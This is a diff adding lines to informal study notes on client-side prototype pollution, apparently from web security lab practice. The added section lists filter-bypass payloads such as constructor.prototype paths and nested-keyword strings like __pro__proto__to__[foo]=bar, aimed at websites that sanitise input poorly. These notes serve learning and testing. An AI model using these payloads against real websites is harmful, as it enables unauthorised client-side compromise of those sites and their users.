@@ -19,3 +19,15 @@ find source by using __proto__.foo=bar or __proto__[foor]=bar in url or in json-
 then use devtools and type Object.prototype in console to looke if we have any new property names as foo with value bar---->
 if it does look at sources tab or debugger tab in browser and see thre codes -----> it would have some gadget we can use
 make use of gadget and exploit it as needed
+
++++++++++++prototype pollution via constructor++++++++++++++
+if __proto__ is blocked we may be able to still cause pollution using;
+constructor.prototype.foo=bar or use []
+
+if flawed validation we may use -->vulnerable-website.com/?__pro__proto__to__.gadget=payload
+sometimes the validation may be flawed we can check that from sources or debugger file in devtools for that then we might use something like
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+
